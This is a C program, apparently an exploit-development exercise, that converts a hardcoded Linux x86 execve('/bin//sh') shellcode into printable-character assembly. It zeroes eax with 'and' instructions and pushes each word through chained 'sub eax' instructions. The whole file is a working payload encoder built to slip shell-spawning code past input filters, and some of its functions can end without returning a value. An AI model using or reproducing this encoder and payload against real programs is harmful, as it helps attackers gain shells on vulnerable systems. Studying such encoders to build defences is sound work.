#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct RESULT_BYTE {
	int overflow; // 进位的个数
	unsigned char a;
	unsigned char b;
	unsigned char c;
};

struct RESULT{
	int result_a;
	int result_b;
	int result_c;
};

unsigned char *getMAX(unsigned char *a, unsigned char *b, unsigned char *c){
	unsigned char *MAX = a;
	if (*b > *MAX){
		MAX = b;
	}
	if (*c > *MAX){
		MAX = c;
	}
	return MAX;
}

unsigned char *getMIN(unsigned char *a, unsigned char *b, unsigned char *c){
	unsigned char *MIN = a;
	if (*b < *MIN){
		MIN = b;
	}
	if (*c < *MIN){
		MIN = c;
	}
	return MIN;
}

struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsigned char RIGHT){
	unsigned char LEFT_A = LEFT;
	unsigned char RIGHT_A = RIGHT;
	//unsigned char a = LEFT_A + (RIGHT_A - LEFT_A) / 2;
	unsigned char a = LEFT_A;// + (RIGHT_A - LEFT_A) / 2;

	unsigned char LEFT_B = LEFT;
	unsigned char RIGHT_B = RIGHT;
	//unsigned char b = LEFT_B + (RIGHT_B - LEFT_B) / 2;
	unsigned char b = LEFT_B;// + (RIGHT_B - LEFT_B) / 2;

	unsigned char LEFT_C = LEFT;
	unsigned char RIGHT_C = RIGHT;
	//unsigned char c = LEFT_C + (RIGHT_C - LEFT_C) / 2;
	unsigned char c = LEFT_C;// + (RIGHT_C - LEFT_C) / 2;

	int counter = 0;

	while(counter++ < 0xFF){
		// printf("[TIMES] : [%x]\n", counter);
		// printf("[%d] [%d] [%d]\n", a, b, c);
		unsigned char temp = (a + b + c); // 计算和
		unsigned char *pointer;
				if (temp > target){
					pointer = getMAX(&a, &b, &c);	
					*pointer = *pointer - 1;
				}else if(temp < target){
					pointer = getMIN(&a, &b, &c);	
					*pointer = *pointer + 1;
				}else{
					if (a < 0x20 || b < 0x20 || c < 0x20){
						// 缠绕一圈
						a += 85;
						b += 85;
						c += 86;
					}
					
					struct RESULT_BYTE * result = malloc(sizeof(struct RESULT_BYTE));
					memset(result, 0, sizeof(struct RESULT_BYTE));
					result->a = a;
					result->b = b;
					result->c = c;
					int temp = a + b + c;
					result->overflow = temp / 0x100;
					// printf("[FOUND] : 0x%2x + 0x%2x + 0x%2x [OVER] : %d\n", a, b, c, temp / 0x100);

					return result;
				}
	}
}

struct RESULT * search(int target, char left, char right){
	
	struct RESULT * result = malloc(sizeof(struct RESULT));
	memset(result, 0, sizeof(struct RESULT));
	unsigned char byte_l = (target >> 0) % 0x100;
	unsigned char byte_ml = (target >> 8) % 0x100;
	unsigned char byte_mh = (target >> 16) % 0x100;
	unsigned char byte_h = (target >> 24) % 0x100;
	int overflow = 0;

	struct RESULT_BYTE * result_byte = NULL;
	// printf("-------------------------\n");
	// printf("Searching : [%d] = [0x%x]\n", byte_l, byte_l);
	result_byte = searchByte(byte_l, left, right);
	result->result_a = result->result_a + result_byte->a;//
	result->result_b = result->result_b + result_byte->b;//
	result->result_c = result->result_c + result_byte->c;//
	overflow = result_byte->overflow;
	free(result_byte);

	// printf("-------------------------\n");
	// printf("Searching : [%d] = [0x%x]\n", byte_ml, byte_ml);
	result_byte = searchByte(byte_ml - overflow, left, right);
	result->result_a = result->result_a + result_byte->a * 0x100;//
	result->result_b = result->result_b + result_byte->b * 0x100;//
	result->result_c = result->result_c + result_byte->c * 0x100;//
	overflow = result_byte->overflow;
	free(result_byte);
	// printf("-------------------------\n");
	// printf("Searching : [%d] = [0x%x]\n", byte_mh, byte_mh);
	result_byte = searchByte(byte_mh - overflow, left, right);
	result->result_a = result->result_a + result_byte->a * 0x10000;//
	result->result_b = result->result_b + result_byte->b * 0x10000;//
	result->result_c = result->result_c + result_byte->c * 0x10000;//
	overflow = result_byte->overflow;
	free(result_byte);
	//printf("-------------------------\n");
	//printf("Searching : [%d] = [0x%x]\n", byte_h, byte_h);
	result_byte = searchByte(byte_h - overflow, left, right);
	result->result_a = result->result_a + result_byte->a * 0x1000000;//
	result->result_b = result->result_b + result_byte->b * 0x1000000;//
	result->result_c = result->result_c + result_byte->c * 0x1000000;//
	overflow = result_byte->overflow;
	free(result_byte);
	// printf("-------------------------\n");
	return result;
}

void setZero(){
	printf("and eax, 49494949H\n");
	printf("and eax, 30303030H\n");
}

void printComment(int target){
	printf(";========================\n");
	printf(";  set eax = %x\n", target);
	printf(";========================\n");
}

unsigned char * build(char * shellcode, char left, char right){
	int length_shellcode = strlen(shellcode);
	int length_malloc = (length_shellcode / 4 + 1 + 1) * 4;
	char * pointer = malloc(length_malloc);
	memset(pointer, 0x90, length_malloc);
	int i = 0;
	/*
	// shellcode : 
	// 11 22 33 44 55 66 77
	//   \  \  \  \  \  \  \
	// 90 11 22 33 44 55 66 77
*/
	// strcpy
	for (i = 0; i < length_shellcode; i++){
		pointer[i] = shellcode[i];
	}

	// target pointer to the last integer
	int *target = ((int *)pointer) + ((length_malloc) / 4 - 1);

	for (i = 0; i < (length_malloc / 4); i++){
		struct RESULT * result = search(0x100000000 - *target, left, right);
		printComment(*target);
		setZero();
		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
		printf("push eax\n");
		free(result);
	
		target--;
			
	}
	
	/*
	for(i = 0; i < length_shellcode; i++){
		pointer[length_malloc - 1 - i] = shellcode[length_shellcode - 1 - i];
	}

	int * target = (int *)pointer;
	for (i = 0; i < (length_malloc / 4); i++){
		struct RESULT * result = search(0x100000000 - *target, left, right);
		printComment(*target);
		setZero();
		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
		printf("push eax\n");
		free(result);
	
			target++;
	}
	*/
	/*

	for(i = 0; i < length_shellcode; i++){
		pointer[i] = shellcode[length_shellcode - i - 1];	
	}
	int *target = (int *)pointer;
	for (i = 0; i < (length_malloc / 4); i++){
	//	printf("target[%d] -> [%x]\n", i, *target);
//		search(*target, 0x20, 0x7f);
		struct RESULT * result = search(0x100000000 - *target, left, right);
		printComment(*target);
		setZero();
		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
		printf("push eax\n");
		free(result);
		target++;
	}
	*/
}


int main(){
	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
	build(shellcode, 0x20, 0x7f); // 设置参数似乎并没用
	return 0;
}

// 产生一个问题 :
// C语言在计算立即数的时候的内存是怎么分配的
